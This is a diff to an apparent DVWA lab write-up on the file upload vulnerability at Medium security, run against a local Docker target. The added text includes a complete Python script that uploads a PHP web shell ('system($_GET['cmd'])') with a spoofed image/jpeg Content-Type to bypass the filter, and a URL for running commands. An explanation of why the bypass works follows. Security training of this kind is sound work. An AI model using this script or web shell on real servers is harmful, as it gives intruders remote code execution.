@@ -223,12 +223,50 @@ Explanation of why it worked: In this security level, the website simply allows 
 
 ### Security Level: Medium
 
-Payload Used: File uploaded containing the command <?php system($_GET['cmd']); ?>
+Payload Used: File uploaded containing a script:
+```import requests
 
-Result: The URL can now be used to execute commands such as ls and achieve full remote code execution.
+# 1. The target URL in your local Docker container
+url = "http://127.0.0.1:8080/vulnerabilities/upload/"
+
+# 2. Your active browser session
+cookies = {
+    "PHPSESSID": "aomhsi8s8787jjtg2ov753itu4", 
+    "security": "medium"
+}
+
+# 3. The Web Shell Payload
+shell_code = "<?php system($_GET['cmd']); ?>"
+
+# 4. The Bypass: Forging the Request
+# We tell Python to upload a file named 'shell.php', containing our code,
+# but we explicitly tell the server the MIME type is 'image/jpeg'.
+files = {
+    'uploaded': ('shell.php', shell_code, 'image/jpeg')
+}
+
+# The form also requires the Upload button to be "clicked"
+data = {
+    'Upload': 'Upload'
+}
+
+# 5. Fire the Request
+print("[*] Sending spoofed HTTP request...")
+response = requests.post(url, files=files, data=data, cookies=cookies)
+
+# 6. Check the Results
+if "successfully uploaded" in response.text:
+    print("[+] Bypass Successful!")
+    print("[+] The server accepted the .php file because the header said it was an image.")
+    print("[+] Execute commands here: http://127.0.0.1:8080/hackable/uploads/shell.php?cmd=whoami")
+else:
+    print("[-] Upload failed. Double-check your PHPSESSID cookie and ensure DVWA is set to Medium.")
+```
+
+Result: Successfully bypassed the file type filter, uploaded the PHP web shell, and achieved Remote Code Execution.
 
 Screenshot:
-<img width="1913" height="963" alt="File Upload Low" src="https://github.com/user-attachments/assets/894063e5-3837-46fa-8c83-5892130fbaeb" />
+<img width="1918" height="962" alt="File Upload Medium" src="https://github.com/user-attachments/assets/2ce5282e-5d1c-4140-b8db-0dc2e63f9acf" />
 
 
 
@@ -236,4 +274,5 @@ Screenshot:
 
 
 
-Explanation of why it worked: In this security level, the website simply allows for any file to be uploaded without checking for file extensions. As a result, because the web server is designed to execute php files, we can simply run php code directly on the server.
+
+Explanation of why it worked: The Medium security level attempts to restrict uploads by verifying the Content-Type header provided by the client (e.g., ensuring it is image/jpeg or image/png). However, it relies entirely on user-controllable input without validating the actual file contents or extension on the server side. By writing a Python script to construct the HTTP POST request, the Content-Type header can be manually spoofed to an accepted MIME type, tricking the application into storing the executable PHP script.
